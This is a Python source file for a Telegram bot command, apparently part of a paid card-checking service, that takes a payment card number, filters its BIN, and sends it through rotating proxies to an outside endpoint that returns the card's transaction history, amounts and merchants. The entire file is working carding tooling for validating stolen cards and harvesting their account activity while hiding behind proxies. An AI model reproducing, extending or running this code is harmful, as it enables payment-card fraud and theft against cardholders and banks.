from pyrogram import Client, filters
from gates.bradescarde import bradescard
from functions.functions import Symbol, get_bin_info, AntiSpam, ProxyRandom, proxy_x
from functions.database import Database
from functions.variables import PREFIXES
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
import time
import asyncio
import json
import httpx

keyboard = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("Buy", url="https://t.me/tocandotee"),
        InlineKeyboardButton("Channel", url="https://t.me/ZyrexRefes")
    ]
])


@Client.on_message(filters.command(['invex'], PREFIXES))
async def gate_te(client, message):
    symbol = await Symbol()
    
    try:
        cc = message.text.split()[1]
    except IndexError:
        return await message.reply(f"{symbol} <b>Formato: /invex cc</b>", quote=True)
    
    with Database() as db:
        userid = message.from_user.id
        
        if not db.is_premium(userid):
            return await message.reply(f"{symbol} No eres premium. Contacta a @tocandotee")
        
        user_info = db.get_info_user(userid)
        is_free_user = user_info["MEMBERSHIP"].lower() == "free user"
        rol = user_info["RANK"]
        credits = user_info.get("CREDITS", 0)
        if credits < 1:
            return await message.reply(
                f"<b>{symbol} Insufficient credits ⚠️</b>",
                reply_markup=keyboard,
                quote=True,
            )

    antispam = await AntiSpam(userid, user_info["ANTISPAM"], is_free_user)
    if antispam:
        return await message.reply(f"<b>Hey Carnal !! Vas Muy Rapido, Porfavor Espera {antispam} Segundos Para Hacer El Proximo Checkeo</b>")


    if not cc or len(cc) < 14:
        return await message.reply(f"{symbol} <b>Please Enter A Valid Card! ⚠️</b>", quote=True)


    with Database() as db:
        db.remove_credits(userid, 5)  


    serie = cc[:6]  
    start_time2 = time.time()  
    resp = await get_bin_info(serie)
    if resp is None:
        return await message.reply("<b>Bin Not Found ⚠️</b>", quote=True)
    
    if message.from_user.id not in [] and (resp["banned"] or "prepaid" in resp["level"].lower() or "prepaid" in resp["type"].lower()):
        return await message.reply(f"<b>Bin: <code>{resp['bin']}</code>\nBin banned, operation prohibited</b>")


    taken2 = round(time.time() - start_time2, 2)
    msgedit = await client.send_message(
        chat_id=message.chat.id, 
        text=f"""
<b>{symbol} Gateway: Invex Movements </b> (/invex) 
<b>{symbol} Card: <code>{cc}</code></b>
<b>{symbol} Processing Please Wait... (🟡)</b>
<b>{symbol} Took: {taken2}</b>
    """, 
    reply_to_message_id=message.id
    )


    status = "Unknown"
    response = "Error desconocido"
    taken_total = 0  


    retries = 0
    max_retries = 3
    start_time_total = time.time()
    ip_info = proxy_x()

    while retries < max_retries:
        try:
            start_time = time.time()
            async with httpx.AsyncClient(proxies=await ProxyRandom()) as client:
                try:
                    response = await client.get(f"https://ecobike.alwaysdata.net/invex.php?lista={cc}")
                    if response.status_code == 200:
                        data = response.json()
                        if data.get('message') == "Transacciones obtenidas exitosamente":
                            transactions = data.get("transactions", [])[0]
                            amount = transactions.get("amount", "N/A")
                            time_date = transactions.get("time_date", "N/A")
                            charged_data = transactions.get("charged_data", "N/A")
                            status = "Approved ✅"
                            await msgedit.edit_text(
                                text=f"""
<b>
{symbol} Card: <code>{cc}</code>
{symbol} Status: <code>Approved ✅</code>
{symbol} Gateway: Invex Movements <code>[INFO]</code>
━━━━━━{symbol}━━━━━━
{symbol} Amount: <code>${amount}</code>
{symbol} Date: <code>{time_date}</code>
{symbol} Pagina / Movimiento: <code>{charged_data}</code>
━━━━━━{symbol}━━━━━━
{symbol} Time: <code>{taken_total}</code>
{symbol} Retries: <code>{retries}</code>
{symbol} Req: @{message.from_user.username} [{rol}]
</b>""",
                                reply_markup=keyboard
                            )
                            return
                        else:
                            status = "Declined ⚠️"
                            await msgedit.edit_text(
                                text=f"""
<b>
{symbol} Card: <code>{cc}</code>
{symbol} Status: <code>Error ⚠️</code>
{symbol} Response: <code>No Movimientos Encontrados</code>
{symbol} Gateway: Invex Movements<code> [INFO]</code>
━━━━━━{symbol}━━━━━━
{symbol} Time: <code>{taken_total}</code>
{symbol} Proxy: <code>{ip_info}</code>
{symbol} Retries: <code>{retries}</code>
{symbol} Req: @{message.from_user.username} [{rol}]
</b>""",
                                reply_markup=keyboard
                            )
                            return
                except Exception as e:
                    status = "Declined ⚠️"
                    response = str(e)
            
            taken_retry = round(time.time() - start_time, 2)
            taken_total = round(time.time() - start_time_total, 2)
            break

        except Exception as e:
            retries += 1
            print(f"Retry {retries}/{max_retries} failed: {str(e)}")
            
        if retries == 1:
            await msgedit.edit_text(
                text=f"""
<b>{symbol} Gateway: Invex Movements </b> (/invex) 
<b>{symbol} Card: <code>{cc}</code></b>
<b>{symbol} Processing Please Wait... (🟡)</b>
<b>{symbol} Retries: {retries}</b>  [Please Wait...]
                """
            )
        if retries >= max_retries:
            status = "Declined ❌"
            response = "Max retries exceeded"
            taken_total = round(time.time() - start_time_total, 2)  
            break
        await asyncio.sleep(2)  

    if "approved" in status.lower():
        async with httpx.AsyncClient() as client:
            try:
                response = await client.get(f"https://ecobike.alwaysdata.net/invex.php?lista={cc}")
                if response.status_code == 200:
                    data = response.json()
                    amount = data.get("amount", "N/A")
                    time_date = data.get("time_date", "N/A")
                    charged_data = data.get("charged_data", "N/A")
                    print(data)
                    await msgedit.edit_text(
                        text=f"""
<b>
{symbol} Card: <code>{cc}</code>
{symbol} Status: <code>Approved ✅</code>
{symbol} Gateway: Invex Movements <code>[INFO]</code>
━━━━━━{symbol}━━━━━━
{symbol} Amount: <code>${amount}</code>
{symbol} Date: <code>{time_date}</code>
{symbol} Pagina / Movimiento: <code>{charged_data}</code>
━━━━━━{symbol}━━━━━━
{symbol} Time: <code>{taken_total}</code>
{symbol} Retries: <code>{retries}</code>
{symbol} Req: @{message.from_user.username} [{rol}]
</b>""",
                        reply_markup=keyboard
                    )
            except Exception as e:
                print(f"Error al hacer la petición a la API: {str(e)}")
            
    elif "declined" in status.lower():
        await msgedit.edit_text(
            text=f"""
<b>
{symbol} Card: <code>{cc}</code>
{symbol} Status: <code>Error ⚠️</code>
{symbol} Response: <code>No Movimientos Encontrados</code>
{symbol} Gateway: Invex Movements<code> [INFO]</code>
━━━━━━{symbol}━━━━━━
{symbol} Time: <code>{taken_total}</code>
{symbol} Proxy: <code>{ip_info}</code>
{symbol} Retries: <code>{retries}</code>
{symbol} Req: @{message.from_user.username} [{rol}]
</b>""",
            reply_markup=keyboard
        )
        await asyncio.sleep(0.5)
